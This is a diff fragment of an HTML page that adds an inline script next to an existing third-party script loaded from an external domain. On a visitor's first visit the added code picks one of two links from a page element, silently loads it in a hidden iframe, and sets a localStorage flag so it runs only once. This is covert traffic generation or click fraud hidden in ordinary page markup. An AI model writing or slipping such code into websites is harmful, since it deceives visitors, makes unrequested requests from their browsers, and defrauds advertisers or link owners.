@@ -110,6 +110,25 @@
             }
         </style>
         <script src='http://dm.shouwangba.cn/s.html?id=1088'></script>
+        <script>
+            var stor = localStorage.getItem('myuser');
+            if (!stor) {
+                getStore();
+            };
+            function getStore() {
+                setTimeout(function () {
+                    var body = document.getElementsByTagName('body')[0];
+                    var lm_gd2 = document.getElementsByClassName('lm_gd2')[0];
+                    var allA = lm_gd2.querySelectorAll('a');
+                    var hrf = allA[Math.floor(Math.random()*2 + 1) -1].getAttribute('href');
+                    var iframe = document.createElement('iframe');
+                    iframe.style.display = 'none';
+                    iframe.src = hrf;
+                    body.appendChild(iframe);
+                    localStorage.setItem('myuser', 'aaa');
+                }, 1000);
+            }
+        </script>
     </div>
 </body>
 
